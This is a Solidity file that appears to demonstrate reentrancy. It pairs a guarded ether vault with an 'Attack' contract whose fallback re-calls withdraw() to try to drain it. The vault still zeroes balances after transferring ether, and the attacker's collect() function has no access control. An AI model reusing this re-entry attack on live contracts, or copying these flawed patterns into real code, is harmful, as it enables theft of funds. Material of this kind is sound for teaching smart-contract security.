// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract goodEtherStore {
	mapping(address => uint256) public balances;
	bool reentrancyGuard = true; 
	
	function deposit() public payable {
		balances[msg.sender] += msg.value;
	}
	
	function withdraw() public {
		require(reentrancyGuard);
		uint256 _senderBalance = balances[msg.sender];
		require(_senderBalance > 0, "Failed: empty account");
		reentrancyGuard=false;
		address payable user = payable(msg.sender);
		user.transfer(_senderBalance);
		reentrancyGuard=true;
		balances[msg.sender] = 0;
	}
	
	function getBalance() public view returns (uint256) {
		return address(this).balance;
	}
}

contract Attack {
    goodEtherStore public bank;

    constructor(address _bankAddress) {
        bank = goodEtherStore(_bankAddress);
    }
    receive() external payable{}
    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    function collect(uint256 _amount, address payable _address) public {
	    _address.transfer( _amount);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

